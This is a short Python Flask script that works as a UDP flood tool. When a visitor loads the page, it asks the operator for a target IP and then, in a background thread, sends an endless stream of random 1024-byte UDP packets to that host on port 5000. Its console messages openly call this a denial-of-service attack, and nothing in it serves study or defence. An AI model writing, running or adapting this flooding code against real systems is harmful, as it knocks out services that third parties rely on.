from flask import Flask, request
import socket
import random
import threading
import time

app = Flask(__name__)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1024)

def send_udp_packets(ip, port):
    sent = 0
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"Sent {sent} packets to {ip} at port {port}.")
        except Exception as e:
            print(f"Error encountered: {e}")
            time.sleep(0.1)

@app.route('/')
def index():
    client_ip = request.remote_addr

    print(f"Incoming connection from {client_ip}")

    target_ip = input(f"DoS? (Target IP or press Enter to skip): ").strip()
    if target_ip:
        port = 5000  
        print(f"Starting DoS attack on {target_ip} at port {port}...")
        thread = threading.Thread(target=send_udp_packets, args=(target_ip, port))
        thread.daemon = True
        thread.start()
    else:
        print("DoS skipped.")

    return f"Hello from Flask! Your IP is {client_ip}."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5007)
